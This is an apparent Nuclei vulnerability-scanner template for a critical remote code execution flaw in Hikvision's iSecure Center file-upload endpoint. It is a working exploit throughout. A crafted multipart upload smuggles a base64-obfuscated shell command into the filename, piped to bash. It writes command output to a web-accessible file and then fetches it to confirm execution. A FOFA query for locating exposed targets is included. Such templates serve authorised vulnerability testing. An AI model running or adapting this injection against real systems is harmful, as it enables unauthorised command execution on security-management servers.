http:
- extractors:
  - internal: true
    name: token
    part: header_1
    regex:
    - Token:\s*([A-Za-z0-9=]+)
    type: regex
  matchers:
  - dsl:
    - status_code_1 == 403 && status_code_2 == 200 && status_code_3 == 200
    - contains(body_3,'uid=')
    type: dsl
  raw:
  - 'GET /iac/configService/v1/address HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /svm/api/v1/productFile?type=product&ip=127.0.0.1& HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypicdtung

    {{token}}


    ------WebKitFormBoundarypicdtung

    Content-Disposition: form-data; name="file";filename=test";echo aWQgPiAuLi8uLi9vcHNNZ3JDZW50ZXIvZGF0YS9iaWNfZG93bmxvYWQvbmJrY2Rzc3guaHRtbA==|base64
    -d|bash;.zip

    Content-Type: application/zip


    test

    ------WebKitFormBoundarypicdtung--

    '
  - 'GET /download_bic/nbkcdssx.html HTTP/1.1

    Host: {{Hostname}}

    {{token}}

    '
id: hikvision-csmp-productfile-rce-2
info:
  author: leadlife
  description: "\u6D77\u5EB7\u5A01\u89C6-\u7EFC\u5408\u5B89\u9632\u7BA1\u7406\u5E73\
    \u53F0 /svm/api/v1/productFile \u8DEF\u5F84\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\
    \u4E0A\u4F20 rce"
  metadata:
    fofa-query: app="HIKVISION-iSecure-Center"
    max-request: 3
  name: hikvision-csmp-productfile-rce-2
  severity: critical
  tags: rce, hikvision, file-upload
